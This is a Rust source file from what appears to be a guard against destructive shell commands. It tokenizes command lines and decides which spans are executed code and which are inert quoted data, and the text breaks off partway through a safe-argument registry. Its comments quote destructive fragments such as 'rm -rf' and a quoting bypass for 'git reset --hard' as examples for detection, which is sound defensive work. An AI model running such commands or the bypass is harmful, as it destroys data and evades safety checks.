//! Execution-context classification for shell commands.
//!
//! This module provides fast classification of which parts of a command line
//! are actually executed vs merely data. This enables the pattern matching
//! engine to reduce false positives by only checking executable contexts.
//!
//! # Design Principles
//!
//! 1. **Ambiguous → Executed**: If classification is uncertain, treat as executable
//! 2. **False positives over false negatives**: Better to block safe commands than allow dangerous ones
//! 3. **Performance**: Classification adds <100μs to typical commands
//!
//! # Examples
//!
//! ```ignore
//! use destructive_command_guard::context::{classify_command, SpanKind};
//!
//! let spans = classify_command("git commit -m 'Fix rm -rf detection'");
//! // The 'Fix rm -rf detection' part is classified as Data (single-quoted)
//! // The 'git commit -m' part is classified as Executed
//! ```

use aho_corasick::AhoCorasick;
use smallvec::SmallVec;
use std::borrow::Cow;
use std::ops::Range;
use std::sync::LazyLock;

/// Classification of a command-line span.
///
/// Each span is classified according to whether it will be executed by the shell
/// or is purely data. The pattern matching engine uses this to reduce matching
/// in known-safe contexts.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
pub enum SpanKind {
    /// Command word or unquoted argument - fully executed by shell.
    /// Pattern matching MUST be applied.
    Executed,

    /// Quoted argument to a known-safe command (e.g., `git commit -m "..."`).
    /// Pattern matching should be applied with lower priority.
    Argument,

    /// Content of -c/-e flags (bash -c, python -c, node -e).
    /// Pattern matching MUST be applied - this is code!
    InlineCode,

    /// Single-quoted string - no variable substitution possible.
    /// Pattern matching can be SKIPPED (safe to ignore).
    Data,

    /// Heredoc body - escalate to Tier 2/3 analysis.
    /// Pattern matching should be applied with heredoc-aware logic.
    HeredocBody,

    /// Ambiguous context - conservative treatment as Executed.
    /// Pattern matching MUST be applied.
    Unknown,

    /// Shell comment (starts with #).
    /// Pattern matching should be SKIPPED.
    Comment,
}

impl SpanKind {
    /// Returns true if this span should have destructive patterns checked.
    #[inline]
    #[must_use]
    pub const fn requires_pattern_check(self) -> bool {
        match self {
            Self::Executed | Self::InlineCode | Self::HeredocBody | Self::Unknown => true,
            Self::Argument | Self::Data | Self::Comment => false,
        }
    }

    /// Returns true if this span is definitely safe to skip pattern matching.
    #[inline]
    #[must_use]
    pub const fn is_safe_data(self) -> bool {
        matches!(self, Self::Data | Self::Comment)
    }

    /// Returns true if this is executed code (not a data argument).
    #[inline]
    #[must_use]
    pub const fn is_executable(self) -> bool {
        matches!(self, Self::Executed | Self::InlineCode | Self::Unknown)
    }
}

/// A classified span within a command string.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Span {
    /// The classification of this span.
    pub kind: SpanKind,
    /// Byte range within the original command string.
    pub byte_range: Range<usize>,
}

impl Span {
    /// Create a new span.
    #[inline]
    #[must_use]
    pub const fn new(kind: SpanKind, start: usize, end: usize) -> Self {
        Self {
            kind,
            byte_range: start..end,
        }
    }

    /// Get the span text from the original command.
    #[inline]
    #[must_use]
    pub fn text<'a>(&self, command: &'a str) -> &'a str {
        &command[self.byte_range.clone()]
    }

    /// Returns the length of this span in bytes.
    #[inline]
    #[must_use]
    pub const fn len(&self) -> usize {
        self.byte_range.end - self.byte_range.start
    }

    /// Returns true if this span is empty.
    #[inline]
    #[must_use]
    pub const fn is_empty(&self) -> bool {
        self.byte_range.start == self.byte_range.end
    }
}

type SpanVec = SmallVec<[Span; 32]>;

/// A collection of classified spans for a command.
///
/// This is the main output of the context classifier. It can be used to:
/// - Check if any executable spans contain destructive patterns
/// - Skip pattern matching for data-only spans
/// - Provide context for error messages and explanations
#[derive(Debug, Clone, Default)]
pub struct CommandSpans {
    /// All classified spans, in order of appearance.
    spans: SpanVec,
}

impl CommandSpans {
    /// Create an empty spans collection.
    #[inline]
    #[must_use]
    pub fn new() -> Self {
        Self {
            spans: SpanVec::new(),
        }
    }

    /// Add a span to the collection.
    #[inline]
    pub fn push(&mut self, span: Span) {
        self.spans.push(span);
    }

    /// Get all spans.
    #[inline]
    #[must_use]
    pub fn spans(&self) -> &[Span] {
        &self.spans
    }

    /// Get only spans that require pattern checking.
    pub fn executable_spans(&self) -> impl Iterator<Item = &Span> {
        self.spans
            .iter()
            .filter(|s| s.kind.requires_pattern_check())
    }

    /// Get only data spans (safe to skip).
    pub fn data_spans(&self) -> impl Iterator<Item = &Span> {
        self.spans.iter().filter(|s| s.kind.is_safe_data())
    }

    /// Returns true if any span requires pattern checking.
    #[must_use]
    pub fn has_executable_content(&self) -> bool {
        self.spans.iter().any(|s| s.kind.requires_pattern_check())
    }

    /// Returns true if the entire command is safe data (rare).
    #[must_use]
    pub fn is_all_data(&self) -> bool {
        !self.spans.is_empty() && self.spans.iter().all(|s| s.kind.is_safe_data())
    }

    /// Extract the text content for all executable spans.
    #[must_use]
    pub fn executable_text<'a>(&self, command: &'a str) -> Vec<&'a str> {
        self.executable_spans().map(|s| s.text(command)).collect()
    }
}

/// State machine states for the shell tokenizer.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum TokenizerState {
    Normal,
    SingleQuote,
    DoubleQuote,
    CommandSubst,           // Inside $(...), scanning for matching )
    Backtick,               // Inside `...`, scanning for matching `
    Comment,                // Inside #... (newline terminates)
    PowerShellBlockComment, // Inside <# ... #> (PowerShell block comment; #> terminates)
}

/// Shell command tokenizer and context classifier.
pub struct ContextClassifier {
    /// Commands that take inline code as the next argument after -c/-e
    inline_code_commands: &'static [&'static str],
}

impl Default for ContextClassifier {
    fn default() -> Self {
        Self::new()
    }
}

impl ContextClassifier {
    /// Create a new context classifier with default settings.
    #[must_use]
    pub const fn new() -> Self {
        Self {
            inline_code_commands: &[
                "bash", "sh", "zsh", "ksh", "dash", // shells with -c
                "python", "python3", "python2", // python with -c
                "node", "nodejs", // node with -e
                // Bun and Deno accept Node's inline-evaluation flags, so their
                // payloads are executed code too. Omitting them made the
                // single-quoted payload read as argv data, which quick-rejected
                // `bun -e '<destructive>'` while the identical `node -e`
                // spelling was denied (issue #397).
                "bun", "deno", //
                "ruby", // ruby with -e
                "perl", // perl with -e
                "php",  // php with -r
                "lua",  // lua with -e
            ],
        }
    }

    /// Returns a `CommandSpans` structure containing classified spans.
    /// Each byte in the command will belong to exactly one span.
    ///
    /// A command with heredoc bodies is also read with each body taken apart
    /// from the lines around it (see [`heredoc_body_layouts`]), so that a
    /// quote left open in a body does not make the commands after its
    /// terminator line look quoted. The spans are those of that reading,
    /// except that a byte any other reading, the whole one included, gives a
    /// kind that needs a pattern check keeps that kind: a body found where the
    /// shell has none can show text, never hide it. A command whose readings
    /// would take more than their budget (see [`HeredocReadBudget`]) is one
    /// [`SpanKind::Unknown`] span: every byte of it is checked.
    #[must_use]
    pub fn classify(&self, command: &str) -> CommandSpans {
        let mut budget = HeredocReadBudget::for_command(command);
        self.classify_at_depth(command, 0, &mut budget)
            .unwrap_or_else(|| {
                let mut spans = CommandSpans::new();
                if !command.is_empty() {
                    spans.push(Span::new(SpanKind::Unknown, 0, command.len()));
                }
                spans
            })
    }

    /// [`Self::classify`] of `command`, a body `depth` bodies deep. `None`
    /// when the budget runs out or a body does not slice its command.
    fn classify_at_depth(
        &self,
        command: &str,
        depth: usize,
        budget: &mut HeredocReadBudget,
    ) -> Option<CommandSpans> {
        budget.spend(command)?;
        let whole = self.classify_plain(command);
        if depth >= HEREDOC_SCAN_MAX_DEPTH {
            return Some(whole);
        }
        let mut kept: Option<Vec<Span>> = None;
        for bodies in heredoc_body_layouts(command) {
            let by_parts = self.classify_by_parts(command, &bodies, depth, budget)?;
            kept = Some(match kept {
                None => keep_checked_kinds(&by_parts, whole.spans()),
                Some(kept) => keep_checked_kinds(&kept, &by_parts),
            });
        }
        let Some(kept) = kept else {
            return Some(whole);
        };
        let mut spans = CommandSpans::new();
        for span in kept {
            spans.push(span);
        }
        Some(spans)
    }

    /// The spans of `command` read with `bodies` taken apart: those of the
    /// reading with the bodies blanked, each body that follows a line of its
    /// own replaced by the spans of its own reading. A body inside a
    /// substitution stays part of that substitution's span. `None` when the
    /// budget runs out or a body does not slice the command.
    fn classify_by_parts(
        &self,
        command: &str,
        bodies: &[HeredocBody],
        depth: usize,
        budget: &mut HeredocReadBudget,
    ) -> Option<Vec<Span>> {
        budget.spend(command)?;
        let mut outside = command.as_bytes().to_vec();
        for body in bodies {
            outside[body.range.clone()].fill(b' ');
        }
        // Only whole characters were blanked (see `sanitize_mask_ranges_by_parts`).
        let outside = String::from_utf8(outside).ok()?;
        let mut by_parts: Vec<Span> = Vec::new();
        let mut separate = bodies.iter().filter(|body| body.top_level).peekable();
        let mut covered = 0usize;
        for span in self.classify_plain(&outside).spans() {
            let mut start = span.byte_range.start.max(covered);
            while let Some(body) = separate.next_if(|body| body.range.start < span.byte_range.end) {
                if start < body.range.start {
                    by_parts.push(Span::new(span.kind, start, body.range.start));
                }
                self.push_body_spans(command, &body.range, depth, budget, &mut by_parts)?;
                covered = covered.max(body.range.end);
                start = start.max(covered);
            }
            if start < span.byte_range.end {
                by_parts.push(Span::new(span.kind, start, span.byte_range.end));
            }
        }
        for body in separate {
            self.push_body_spans(command, &body.range, depth, budget, &mut by_parts)?;
        }
        Some(by_parts)
    }

    /// Push the spans of the body at `range` of `command`, read on its own.
    /// `None` when the budget runs out or the range does not slice the
    /// command.
    fn push_body_spans(
        &self,
        command: &str,
        range: &Range<usize>,
        depth: usize,
        budget: &mut HeredocReadBudget,
        spans: &mut Vec<Span>,
    ) -> Option<()> {
        let text = command.get(range.clone())?;
        let offset = range.start;
        spans.extend(
            self.classify_at_depth(text, depth + 1, budget)?
                .spans()
                .iter()
                .map(|inner| {
                    Span::new(
                        inner.kind,
                        inner.byte_range.start + offset,
                        inner.byte_range.end + offset,
                    )
                }),
        );
        Some(())
    }

    #[allow(clippy::too_many_lines)]
    fn classify_plain(&self, command: &str) -> CommandSpans {
        let bytes = command.as_bytes();
        let len = bytes.len();

        if len == 0 {
            return CommandSpans::new();
        }

        let mut spans = CommandSpans::new();
        let mut stack = vec![TokenizerState::Normal];

        // Start of the current span (token or subst)
        let mut span_start = 0;

        // Current classification kind for the active span (only relevant for Normal/DoubleQuote)
        let mut current_kind = SpanKind::Executed;

        // Track inline code flags (e.g. -c)
        let mut pending_inline_code = false;
        let mut last_word_start = 0;
        let mut flag_context = InlineFlagContext::default();

        // Track whether we're in "command position" - where the next word would be an executable.
        // This is true at the start of a command, or right after a command separator (|, ||, &&, ;).
        // Used to treat double-quoted strings at command position as Executed rather than Argument.
        let mut in_command_position = true;

        let in_inline_context = |state_stack: &[TokenizerState]| {
            state_stack
                .iter()
                .any(|s| matches!(s, TokenizerState::CommandSubst | TokenizerState::Backtick))
        };

        let mut i = 0;
        while i < len {
            let byte = bytes[i];
            let Some(current_state) = stack.last().copied() else {
                break;
            };

            // Handle escapes first (except in SingleQuote where \ is literal)
            if byte == b'\\' && current_state != TokenizerState::SingleQuote {
                let effective = !matches!(
                    current_state,
                    TokenizerState::Comment | TokenizerState::PowerShellBlockComment
                );
                if effective {
                    // Consume the backslash and the next character
                    i += 1; // Skip \
                    if i < len {
                        // If newline, it's line continuation (ignored/joined).
                        // If char, it's escaped literal.
                        i += 1;
                    }
                    continue;
                }
            }

            match current_state {
                TokenizerState::Normal => {
                    match byte {
                        b'\'' => {
                            if i > span_start {
                                spans.push(Span::new(current_kind, span_start, i));
                                // If we pushed content before the quote, we're past command position
                                // (e.g., VAR='...' - VAR= is not the command, the quote is not at cmd start)
                                in_command_position = false;
                            }
                            span_start = i;
                            stack.push(TokenizerState::SingleQuote);
                            let inline_here = if pending_inline_code {
                                pending_inline_code = false;
                                true
                            } else if last_word_start < i {
                                let word = &command[last_word_start..i];
                                is_inline_code_flag(word)
                                    && self.check_inline_code_context(
                                        &mut flag_context,
                                        command,
                                        last_word_start,
                                        word,
                                    )
                            } else {
                                false
                            };
                            current_kind = if inline_here {
                                SpanKind::InlineCode
                            } else if in_command_position {
                                // Quoted string at command position is likely an executable
                                SpanKind::Executed
                            } else {
                                SpanKind::Data
                            };
                        }
                        b'"' => {
                            if i > span_start {
                                spans.push(Span::new(current_kind, span_start, i));
                                // If we pushed content before the quote, we're past command position
                                // (e.g., VAR="..." - VAR= is not the command, the quote is not at cmd start)
                                in_command_position = false;
                            }
                            span_start = i;
                            stack.push(TokenizerState::DoubleQuote);
                            let inline_here = if pending_inline_code {
                                pending_inline_code = false;
                                true
                            } else if last_word_start < i {
                                let word = &command[last_word_start..i];
                                is_inline_code_flag(word)
                                    && self.check_inline_code_context(
                                        &mut flag_context,
                                        command,
                                        last_word_start,
                                        word,
                                    )
                            } else {
                                false
                            };
                            current_kind = if inline_here {
                                SpanKind::InlineCode
                            } else if in_command_position {
                                // Quoted string at command position is likely an executable
                                // (e.g., "C:/Program Files/Git/bin/git" status)
                                SpanKind::Executed
                            } else {
                                SpanKind::Argument
                            };
                        }
                        b'$' if i + 1 < len && bytes[i + 1] == b'(' => {
                            if i > span_start {
                                spans.push(Span::new(current_kind, span_start, i));
                            }
                            span_start = i;
                            i += 1; // Skip (
                            stack.push(TokenizerState::CommandSubst);
                            // We don't set current_kind here because CommandSubst span
                            // will be emitted when we POP.
                        }
                        b'`' => {
                            if i > span_start {
                                spans.push(Span::new(current_kind, span_start, i));
                            }
                            span_start = i;
                            stack.push(TokenizerState::Backtick);
                        }
                        b'|' | b';' | b'&'
                            if !(byte == b'&' && is_ampersand_redirection_byte(bytes, i, len)) =>
                        {
                            // Check for operators
                            // For simple classification, treat as break.
                            if i > span_start {
                                spans.push(Span::new(current_kind, span_start, i));
                            }
                            // Determine operator length
                            let mut op_len = 1;
                            if i + 1 < len {
                                let next = bytes[i + 1];
                                if (byte == b'|' && next == b'|') || (byte == b'&' && next == b'&')
                                {
                                    op_len = 2;
                                }
                            }

                            spans.push(Span::new(SpanKind::Executed, i, i + op_len));
                            i += op_len;
                            // Advance loop manually
                            span_start = i;
                            current_kind = SpanKind::Executed;
                            pending_inline_code = false;
                            // After a command separator, the next word is a new command
                            in_command_position = true;
                            continue;
                        }
                        b'<' if i + 1 < len
                            && bytes[i + 1] == b'#'
                            && powershell_block_comment_starts_at(bytes, i) =>
                        {
                            // PowerShell block comment `<# ... #>`. Its body is not
                            // executed, so classify the whole region as a Comment (a
                            // destructive string printed inside it must NOT block).
                            if i > span_start {
                                spans.push(Span::new(current_kind, span_start, i));
                            }
                            span_start = i;
                            stack.push(TokenizerState::PowerShellBlockComment);
                            // Consume both `<#` bytes so the opener's `#` cannot be
                            // mistaken for a `#>` terminator (e.g. `<#>` is an
                            // UNTERMINATED comment, not a complete one).
                            i += 2;
                            continue;
                        }
                        // `${…}` is part of the word it is in, blanks, `;`,
                        // `#` and line ends included: pass over it whole, so
                        // a `#` after a blank inside it starts no comment.
                        b'$' if i + 1 < len && bytes[i + 1] == b'{' => {
                            i = consume_braced_parameter(command, i).0;
                            continue;
                        }
                        // A carriage return or form feed is no blank to the
                        // shell: a `#` right after one is part of a word.
                        b'#' if i == 0
                            || matches!(
                                bytes[i - 1],
                                b' ' | b'\t' | b'\n' | b'|' | b'&' | b';'
                            ) =>
                        {
                            // Comment start if start of word (including after separators).
                            if i > span_start {
                                spans.push(Span::new(current_kind, span_start, i));
                            }
                            span_start = i;
                            stack.push(TokenizerState::Comment);
                        }
                        b' ' | b'\t' | b'\n' => {
                            // Whitespace
                            if i > last_word_start {
                                let word = &command[last_word_start..i];
                                if is_inline_code_flag(word) {
                                    pending_inline_code = self.check_inline_code_context(
                                        &mut flag_context,
                                        command,
                                        last_word_start,
                                        word,
                                    );
                                }
                                // After the first word, we're no longer in command position
                                if in_command_position && !word.is_empty() {
                                    in_command_position = false;
                                }
                            }
                            last_word_start = i + 1;
                        }
                        _ => {}
                    }
                }
                TokenizerState::DoubleQuote => {
                    match byte {
                        b'"' => {
                            // Close double quote
                            stack.pop();
                            // Only emit span if we are not inside a command substitution
                            if !matches!(
                                stack.last(),
                                Some(TokenizerState::CommandSubst | TokenizerState::Backtick)
                            ) {
                                spans.push(Span::new(current_kind, span_start, i + 1));
                                span_start = i + 1;
                                // If this quoted string was the command, we're no longer in command position
                                if current_kind == SpanKind::Executed {
                                    in_command_position = false;
                                }
                                current_kind = SpanKind::Executed;
                            }
                        }
                        b'$' if i + 1 < len && bytes[i + 1] == b'(' => {
                            // Command substitution inside double quotes
                            // We treat it as InlineCode, but do NOT push CommandSubst to stack?
                            // If we don't push, we don't handle nested quotes inside it correctly.
                            // We MUST push CommandSubst to handle nesting.
                            // But when we pop back, we are still in DoubleQuote.

                            // The span logic in dcg expects flat spans.
                            // If we have "foo $(bar) baz", we want:
                            // "foo " (Argument)
                            // "$(bar)" (InlineCode)
                            // " baz" (Argument)

                            // Emit preceding string part
                            if i > span_start {
                                spans.push(Span::new(current_kind, span_start, i));
                            }
                            span_start = i;
                            i += 1; // Skip (
                            stack.push(TokenizerState::CommandSubst);
                        }
                        b'`' => {
                            if i > span_start {
                                spans.push(Span::new(current_kind, span_start, i));
                            }
                            span_start = i;
                            stack.push(TokenizerState::Backtick);
                        }
                        _ => {}
                    }
                }
                TokenizerState::SingleQuote => {
                    if byte == b'\'' {
                        stack.pop();
                        // Only emit span if we are not inside a command substitution
                        if !matches!(
                            stack.last(),
                            Some(TokenizerState::CommandSubst | TokenizerState::Backtick)
                        ) {
                            spans.push(Span::new(current_kind, span_start, i + 1));
                            span_start = i + 1;
                            // If this quoted string was the command, we're no longer in command position
                            if current_kind == SpanKind::Executed {
                                in_command_position = false;
                            }
                            current_kind = SpanKind::Executed;
                        }
                    }
                }
                TokenizerState::CommandSubst => {
                    // Inside $( ... )
                    // We scan for matching ) but respect quotes
                    match byte {
                        b')' => {
                            stack.pop();
                            // Only emit span if we have fully exited the command substitution structure.
                            // If we are still in CommandSubst (nested parens/subshell), we continue scanning.
                            if !in_inline_context(&stack) {
                                spans.push(Span::new(SpanKind::InlineCode, span_start, i + 1));
                                span_start = i + 1;
                                // Restore previous kind based on state we returned to
                                match stack.last() {
                                    Some(TokenizerState::Normal) => {
                                        current_kind = SpanKind::Executed;
                                    }
                                    Some(TokenizerState::DoubleQuote) => {
                                        current_kind = SpanKind::Argument;
                                    }
                                    _ => {}
                                }
                            }
                        }
                        b'(' => {
                            // Nested $( ( ... ) ) - subshell or nested subst?
                            // Just recurse CommandSubst to track parens nesting
                            // Note: $( ( ) ) - the inner ( ) are a subshell.
                            // We can just track depth by pushing another CommandSubst
                            stack.push(TokenizerState::CommandSubst);
                        }
                        b'"' => stack.push(TokenizerState::DoubleQuote),
                        b'\'' => stack.push(TokenizerState::SingleQuote),
                        b'`' => stack.push(TokenizerState::Backtick),
                        b'$' if i + 1 < len && bytes[i + 1] == b'{' => {
                            i = consume_braced_parameter(command, i).0;
                            continue;
                        }
                        b'#' if i == 0 || matches!(bytes[i - 1], b' ' | b'\t' | b'\n') => {
                            stack.push(TokenizerState::Comment);
                        }
                        _ => {}
                    }
                }
                TokenizerState::Backtick => {
                    if byte == b'`' {
                        stack.pop();
                        // Only emit span if we have fully exited the command substitution structure.
                        if !in_inline_context(&stack) {
                            spans.push(Span::new(SpanKind::InlineCode, span_start, i + 1));
                            span_start = i + 1;
                            match stack.last() {
                                Some(TokenizerState::Normal) => {
                                    current_kind = SpanKind::Executed;
                                }
                                Some(TokenizerState::DoubleQuote) => {
                                    current_kind = SpanKind::Argument;
                                }
                                _ => {}
                            }
                        }
                    }
                }
                TokenizerState::Comment => {
                    if byte == b'\n' {
                        stack.pop();
                        // Comment inside CommandSubst?
                        // If we are in CommandSubst, we don't emit span yet.
                        // If we are in Normal, we emit span.
                        if matches!(stack.last(), Some(TokenizerState::Normal)) {
                            spans.push(Span::new(SpanKind::Comment, span_start, i + 1));
                            span_start = i + 1;
                            current_kind = SpanKind::Executed;
                        }
                    }
                }
                TokenizerState::PowerShellBlockComment => {
                    // Terminates on `#>` (consume both bytes). Newlines do NOT end it.
                    if byte == b'#' && i + 1 < len && bytes[i + 1] == b'>' {
                        stack.pop();
                        if matches!(stack.last(), Some(TokenizerState::Normal)) {
                            spans.push(Span::new(SpanKind::Comment, span_start, i + 2));
                            span_start = i + 2;
                            current_kind = SpanKind::Executed;
                        }
                        i += 2;
                        continue;
                    }
                }
            }
            i += 1;
        }

        // Handle remaining
        if span_start < len {
            // Determine fallback kind based on state
            let kind = match stack.last() {
                Some(TokenizerState::Normal) => current_kind,
                Some(TokenizerState::DoubleQuote) => {
                    if current_kind == SpanKind::Argument {
                        SpanKind::Unknown
                    } else {
                        current_kind
                    }
                }
                Some(TokenizerState::SingleQuote) | None => SpanKind::Unknown,
                Some(TokenizerState::Comment | TokenizerState::PowerShellBlockComment) => {
                    SpanKind::Comment
                }
                Some(TokenizerState::CommandSubst | TokenizerState::Backtick) => {
                    SpanKind::InlineCode
                }
            };
            spans.push(Span::new(kind, span_start, len));
        }

        spans
    }

    /// Check if the word before a -c/-e flag is an inline-code command.
    fn check_inline_code_context(
        &self,
        context: &mut InlineFlagContext,
        command: &str,
        flag_start: usize,
        flag: &str,
    ) -> bool {
        context.advance(command, flag_start, |token| self.names_interpreter(token));
        if flag == "-S" {
            // env -S "script" treats the argument as a script/command line.
            // Be conservative: treat as inline code if the current segment
            // contains an env invocation anywhere before the flag.
            context.env_seen
        } else {
            // For standard interpreters (python -c, bash -c): some word of the
            // segment before the flag names one. Flags, assignments and the
            // wrappers that may precede an interpreter are skipped, and a
            // word that names none may be a flag's value, so every word counts.
            context.interpreter_seen
        }
    }

    /// Whether a word, taken as a command word, names one of
    /// `inline_code_commands`: quotes around it, directories and a `.exe`
    /// suffix removed, and a version suffix allowed (`python3.11`, `node18`).
    /// Flags (`-x`) and assignments (`VAR=VAL`) never do.
    fn names_interpreter(&self, token: &str) -> bool {
        if (token.starts_with('-') && token.len() > 1) || token.contains('=') {
            return false;
        }
        let token_unquoted = if ((token.starts_with('"') && token.ends_with('"'))
            || (token.starts_with('\'') && token.ends_with('\'')))
            && token.len() >= 2
        {
            &token[1..token.len() - 1]
        } else {
            token
        };
        // Handle both Unix (/) and Windows (\) path separators
        let base_name = token_unquoted
            .rsplit(&['/', '\\'][..])
            .next()
            .unwrap_or(token_unquoted);
        let base_name = base_name
            .strip_suffix(".exe")
            .or_else(|| base_name.strip_suffix(".EXE"))
            .unwrap_or(base_name);
        self.inline_code_commands.iter().any(|&known| {
            if base_name == known {
                return true;
            }
            // Suffix must be non-empty and consist only of digits/dots
            base_name.strip_prefix(known).is_some_and(|suffix| {
                !suffix.is_empty() && suffix.chars().all(|c| c.is_ascii_digit() || c == '.')
            })
        })
    }
}

/// What the words of the current segment before an inline-code flag hold,
/// kept across the flags of one [`ContextClassifier::classify`] pass.
///
/// Each flag used to rescan its whole segment backwards, for the segment start
/// and then for a command word, so a segment of `n` flags (`c -c -c … sh -c
/// '…'`) cost `n²`: six seconds at 60 KB. Flags arrive in increasing order, so
/// only the text since the previous flag is new; a flag out of order (never
/// produced by `classify`) rescans from its segment start.
#[derive(Debug, Default)]
struct InlineFlagContext {
    /// Where the words below were read up to (a word start).
    scanned_to: usize,
    /// Some word read so far in this segment names an interpreter.
    interpreter_seen: bool,
    /// Some word read so far in this segment is `env` or `…/env`.
    env_seen: bool,
}

impl InlineFlagContext {
    fn advance(
        &mut self,
        command: &str,
        flag_start: usize,
        names_interpreter: impl Fn(&str) -> bool,
    ) {
        let flag_start = flag_start.min(command.len());
        let bytes = command.as_bytes();
        let from = if flag_start < self.scanned_to {
            // Out of order: start over from this flag's segment.
            segment_start_before_flag(command, flag_start)
        } else {
            // A separator since the last flag starts a new segment.
            bytes[self.scanned_to..flag_start]
                .iter()
                .rposition(|byte| matches!(byte, b'|' | b'&' | b';'))
                .map_or(self.scanned_to, |at| self.scanned_to + at + 1)
        };
        if from != self.scanned_to || flag_start < self.scanned_to {
            self.interpreter_seen = false;
            self.env_seen = false;
        }
        let Some(region) = command.get(from..flag_start) else {
            // Not on a char boundary: read nothing new, keep what is known.
            self.scanned_to = flag_start;
            return;
        };
        for token in region.split_whitespace() {
            let trimmed = token.trim_start_matches('\\');
            self.env_seen |= trimmed == "env" || trimmed.ends_with("/env");
            self.interpreter_seen |= names_interpreter(token);
        }
        self.scanned_to = flag_start;
    }
}

/// PowerShell recognizes `<#` as a block-comment opener only where a new token
/// can begin. Embedded text such as `Write-Output<#` remains part of the word;
/// treating it as a comment would mask executable statements that follow.
#[inline]
pub(crate) fn powershell_block_comment_starts_at(bytes: &[u8], index: usize) -> bool {
    index == 0
        || bytes.get(index.saturating_sub(1)).is_some_and(|previous| {
            previous.is_ascii_whitespace()
                || matches!(
                    previous,
                    b'|' | b'&' | b';' | b'(' | b'[' | b'{' | b',' | b'='
                )
        })
}

/// `spans`, except that where a span whose kind skips pattern checks overlaps
/// a span of `checked` whose kind requires them, the overlap takes the
/// `checked` span's kind. Both lists are in order and without overlaps.
fn keep_checked_kinds(spans: &[Span], checked: &[Span]) -> Vec<Span> {
    let mut kept = Vec::with_capacity(spans.len());
    let mut first = 0usize;
    for span in spans {
        if span.kind.requires_pattern_check() {
            kept.push(span.clone());
            continue;
        }
        while checked
            .get(first)
            .is_some_and(|other| other.byte_range.end <= span.byte_range.start)
        {
            first += 1;
        }
        let mut start = span.byte_range.start;
        for other in checked[first..]
            .iter()
            .take_while(|other| other.byte_range.start < span.byte_range.end)
            .filter(|other| other.kind.requires_pattern_check())
        {
            let overlap_start = other.byte_range.start.max(start);
            let overlap_end = other.byte_range.end.min(span.byte_range.end);
            if overlap_start < overlap_end {
                if start < overlap_start {
                    kept.push(Span::new(span.kind, start, overlap_start));
                }
                kept.push(Span::new(other.kind, overlap_start, overlap_end));
                start = overlap_end;
            }
        }
        if start < span.byte_range.end {
            kept.push(Span::new(span.kind, start, span.byte_range.end));
        }
    }
    kept
}

/// Classify a command string's execution contexts.
///
/// This is a convenience function that creates a default classifier
/// and classifies the given command.
///
/// # Example
///
/// ```ignore
/// let spans = classify_command("echo 'hello world' | cat");
/// for span in spans.spans() {
///     println!("{:?}: {}", span.kind, span.text("echo 'hello world' | cat"));
/// }
/// ```
#[inline]
#[must_use]
pub fn classify_command(command: &str) -> CommandSpans {
    ContextClassifier::new().classify(command)
}

/// Returns true when byte `offset` in `command` falls inside a quoted span whose
/// contents are inert data — a single-quoted string (`SpanKind::Data`) or a
/// double-quoted argument (`SpanKind::Argument`).
///
/// This exists for the redirect false-positive class (issue #225): a `>` that
/// appears *inside* a quoted string is a literal byte, not a shell redirect
/// operator, so a redirect rule must not fire on it. The distinction versus the
/// anti-bypass case (`"git">/dev/null reset --hard`) is precisely quote
/// membership: in the bypass the operator is *outside* the quotes (an executable
/// span), whereas in the false positive it is *inside* them.
///
/// Command substitutions inside a double-quoted string (`"$(...)"`) are
/// classified as their own `InlineCode` span by [`ContextClassifier::classify`],
/// so genuinely executable content nested in double quotes is never masked by
/// this check.
#[must_use]
pub fn offset_is_quoted_data(command: &str, offset: usize) -> bool {
    classify_command(command).spans().iter().any(|span| {
        matches!(span.kind, SpanKind::Data | SpanKind::Argument)
            && span.byte_range.contains(&offset)
    })
}

// =============================================================================
// Safe String-Argument Registry (git_safety_guard-t8x.1)
// =============================================================================

/// A registry of commands and flags whose arguments are purely data, not code.
///
/// This enables the pattern matching engine to suppress false positives for
/// common developer workflows like:
/// - `git commit -m "Fix rm -rf detection"` (commit message is data)
/// - `rg "rm -rf" src/` (search pattern is data)
/// - `bd create --description="This blocks rm -rf"` (description is data)
///
/// # Design Principles
///
/// 1. **Conservative**: Only entries where we're 100% confident args are data
/// 2. **Explicit**: Each entry must have a test demonstrating its need
/// 3. **Versioned**: Registry can be extended over time with new entries
#[derive(Debug, Clone)]
pub struct SafeStringRegistry {
    /// Commands where ALL arguments are data (e.g., echo, printf)
    all_args_data: &'static [&'static str],
    /// Command + flag combinations where the flag's value is data
    flag_data_pairs: &'static [SafeFlagEntry],
}

/// An entry for a command+flag combination whose argument is data.
#[derive(Debug, Clone, Copy)]
pub struct SafeFlagEntry {
    /// The command (base name, without path)
    pub command: &'static str,
    /// The short flag (e.g., "-m")
    pub short_flag: Option<&'static str>,
    /// The long flag (e.g., "--message")
    pub long_flag: Option<&'static str>,
    /// Whether the flag can take multiple value tokens (until next flag).
    pub multi_value: bool,
}

impl SafeFlagEntry {
    /// Create a new entry with both short and long flags.
    #[must_use]
    pub const fn new(
        command: &'static str,
        short_flag: Option<&'static str>,
        long_flag: Option<&'static str>,
    ) -> Self {
        Self {
            command,
            short_flag,
            long_flag,
            multi_value: false,
        }
    }

    /// Create an entry with only a short flag.
    #[must_use]
    pub const fn short(command: &'static str, flag: &'static str) -> Self {
        Self {
            command,
            short_flag: Some(flag),
            long_flag: None,
            multi_value: false,
        }
    }

    /// Create an entry with only a long flag.
    #[must_use]
    pub const fn long(command: &'static str, flag: &'static str) -> Self {
        Self {
            command,
            short_flag: None,
            long_flag: Some(flag),
            multi_value: false,
        }
    }

    /// Create an entry with both short and long flags (convenience).
    #[must_use]
    pub const fn both(command: &'static str, short: &'static str, long: &'static str) -> Self {
        Self {
            command,
            short_flag: Some(short),
            long_flag: Some(long),
            multi_value: false,
        }
    }

    /// Create an entry with only a long flag that can take multiple values.
    #[must_use]
    pub const fn long_multi(command: &'static str, flag: &'static str) -> Self {
        Self {
            command,
            short_flag: None,
            long_flag: Some(flag),
            multi_value: true,
        }
    }

    /// Create an entry with both short and long flags that can take multiple values.
    #[must_use]
    pub const fn both_multi(
        command: &'static str,
        short: &'static str,
        long: &'static str,
    ) -> Self {
        Self {
            command,
            short_flag: Some(short),
            long_flag: Some(long),
            multi_value: true,
        }
    }
}

/// The default safe string registry with v1 entries.
pub static SAFE_STRING_REGISTRY: SafeStringRegistry = SafeStringRegistry {
    // Commands where ALL arguments are data (never executed by shell)
    all_args_data: &["echo", "printf"],

    // Command + flag combinations where the flag's value is data
    flag_data_pairs: &[
